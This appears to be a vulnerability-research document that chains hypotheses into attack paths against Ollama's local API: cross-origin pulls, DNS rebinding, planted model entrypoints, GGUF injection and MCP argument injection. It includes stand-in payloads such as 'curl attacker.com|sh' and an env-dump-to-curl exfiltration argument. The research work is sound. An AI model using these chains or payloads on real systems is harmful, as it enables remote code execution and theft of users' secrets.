# Cross-Model Seeds: Team-04

## CROSS-01: file:// CORS Pull → ENTRYPOINT Supply-Chain Chain

Source-A: PH-02 from backward-reasoner (round-1-hypotheses.md) — Arbitrary Model Pull via file:// CORS
Source-B: PH-11 from contradiction-reasoner (round-2-hypotheses.md) — Simple-request bypass of registry.Local for pull
Connection: Both identify the pull vector to `/api/pull` but via different code paths and mechanisms. PH-02 uses the gin-routed path (rc==nil, file://* CORS), while PH-11 uses the registry.Local path (rc!=nil, no-cors/simple-request). Together they cover BOTH deployment configurations. The pulled model in PH-02 seeds the Entrypoint/MCP execution in PH-06 (parth/agents branch). PH-11's registry.Local path has NO CORS protection at all — making it the stronger vector.
Combined hypothesis: Regardless of whether `rc` is nil or not, a cross-origin attacker can trigger `/api/pull` to pull an attacker-controlled model. In the rc!=nil configuration (new registry client), a simple POST (no preflight) executes `registry.Local.handlePull` with zero security controls. In the rc==nil configuration, the file://* CORS origin allows a full cross-origin JSON POST with preflight success. Either way, the attacker model is pulled and, on the parth/agents branch, its Entrypoint/MCPRef fields execute RCE on the next `ollama run`.
Test direction for causal-verifier: Verify that `decodeUserJSON` has no Content-Type check (confirming simple-request bypass); verify that both rc==nil and rc!=nil configurations are deployed in production (ollama.ai recommends the new registry client); trace the full path from handlePull → ConfigV2 deserialization → Entrypoint storage → runEntrypoint execution on parth/agents branch.

---

## CROSS-02: registry.Local Middleware Bypass × DNS Rebinding Private IP

Source-A: PH-04 from backward-reasoner (round-1-hypotheses.md) — DNS Rebinding + registry.Local bypass
Source-B: PH-10 from contradiction-reasoner (round-2-hypotheses.md) — allowedHostsMiddleware IsPrivate() bypass
Connection: Both target the Host validation layer but from different angles. PH-04 bypasses middleware entirely via registry.Local for /api/delete and /api/pull. PH-10 bypasses middleware for OTHER routes (gin-handled routes) by exploiting the `IsPrivate()` check. Together they provide complete bypass: attacker gets /api/delete and /api/pull via registry.Local (no Host check at all), AND gets all other endpoints via IsPrivate() DNS rebind to a LAN IP. The combined attack provides complete API access from a remote attacker position.
Combined hypothesis: A DNS rebinding attack targeting a victim on a LAN (192.168.x.x) can:
1. Access `/api/delete` and `/api/pull` via registry.Local (no host check)
2. Access ALL other endpoints including `/api/create`, `/api/push`, `/api/chat` via IsPrivate() bypass
3. Achieve full API takeover equivalent to local access
This is a complete re-opening of CVE-2024-28224 for LAN-connected victims regardless of whether they use the new registry client.
Test direction for causal-verifier: Verify `netip.MustParseAddr("192.168.1.100").IsPrivate()` returns true in Go; trace the full route-dispatch for a request with Host: 192.168.1.100 through both registry.Local and gin middleware; confirm no additional check validates that the client's source IP matches the Host IP.

---

## CROSS-03: ConfigV2 Unknown-Field Time-Bomb × file:// Pull Trigger

Source-A: PH-02 from backward-reasoner (round-1-hypotheses.md) — file:// CORS triggers pull
Source-B: PH-16 from contradiction-reasoner (round-2-hypotheses.md) — ConfigV2 unknown fields silently stored
Connection: PH-16 identifies that attacker-crafted models pulled TODAY will have their entrypoint payload silently ignored (main branch), but will activate when Ollama updates to include the agents branch merge. PH-02 provides the delivery mechanism: an attacker can trigger model pulls from cross-origin browser pages RIGHT NOW, seeding the victim's model store with time-bomb configs. The combination creates a staged attack: (1) victim opens malicious file today → pull triggered → config with entrypoint payload stored silently; (2) victim updates Ollama → entrypoint activates on next `ollama run`.
Combined hypothesis: Cross-origin pull via file:// (working TODAY on main branch) plants entrypoint payloads in OCI config blobs that are silently ignored on current main but will execute after the agents branch merge ships. The attack window is: NOW (planting) → Ollama agents feature release (activation). No additional user interaction required between planting and activation beyond the normal `ollama run` workflow.
Test direction for causal-verifier: Verify that `ConfigV2` JSON deserialization silently drops unknown fields (no strict/disallow mode); construct a mock OCI config blob with `"entrypoint": "curl attacker.com|sh"` and verify it deserializes without error on main branch; verify the field would be populated if ConfigV2 had that field added.

---

## CROSS-04: GGUF Injection via Blob Upload × file:// CORS Chain

Source-A: PH-14 from contradiction-reasoner (round-2-hypotheses.md) — Cross-origin /api/blobs write + /api/create model poison
Source-B: PH-02 from backward-reasoner (round-1-hypotheses.md) — file:// CORS to /api/pull
Connection: PH-14 shows a two-step injection path (upload blob, then create model) entirely via cross-origin file:// requests. PH-02 shows the single-step pull path. Together they demonstrate that a malicious local HTML file can inject model data through MULTIPLE vectors: (a) via pull from attacker registry — gets full GGUF + config, (b) via direct blob upload + create — injects specific GGUF bytes directly without needing to run a registry. Vector (b) is harder for defenses to block because the blob content is verified by digest (attacker computes correct hash); the malicious nature is only revealed when the GGUF parser processes it.
Combined hypothesis: An attacker delivering a malicious HTML file to a victim has two complementary GGUF injection paths. The blob-upload path (PH-14) works even if the attacker cannot host a registry, requires only HTTP/CORS access to localhost. The pull path (PH-02) is simpler but requires an attacker registry. Both paths result in GGUF data under attacker control being stored and later parsed, with the same DoS/parser-exploit impact.
Test direction for causal-verifier: Verify CreateBlobHandler accepts arbitrary bytes without Content-Type check; verify cross-origin preflight succeeds for POST /api/blobs/:digest with file:// origin; trace blob write → model create → model load → GGUF parse chain; confirm digest validation does not prevent attacker-crafted (but hash-matching) GGUF files.

---

## CROSS-05: MCP Command Spawn × Environment Variable Exfiltration

Source-A: PH-13 from contradiction-reasoner (round-2-hypotheses.md) — MCP subprocess inherits full environment
Source-B: PH-07 from backward-reasoner (round-1-hypotheses.md) — $PROMPT injection into Entrypoint args
Connection: PH-13 shows MCP subprocesses inherit the full process environment. PH-07 shows $PROMPT can inject arguments into Entrypoint. If MCPRef.Args similarly supports a $PROMPT-style substitution (or if args are taken verbatim from config), the attacker has two channels to inject malicious arguments: (1) static via config, (2) dynamic via user prompt. Combined with env inheritance, a crafted MCP invocation can exfiltrate env variables by crafting Args to include env-variable-expanding shell commands.
Combined hypothesis: MCP server spawn from pulled config (PH-13) combined with argument injection (PH-07 pattern applied to MCP Args) and full env inheritance creates a complete environment exfiltration primitive. An attacker can configure MCPRef.Args to include something like `["--env-dump=$(env | base64 | curl -X POST attacker.com -d@-)"]` which, when passed to certain binaries (Python, bash, etc.) executes env exfil.
Test direction for causal-verifier: Verify whether MCPRef.Args fields undergo any sanitization before subprocess spawn; check if $PROMPT substitution is applied to MCP Args as well as Entrypoint; verify subprocess env inheritance (default in Go's exec.Command — no explicit Env field means inherit).
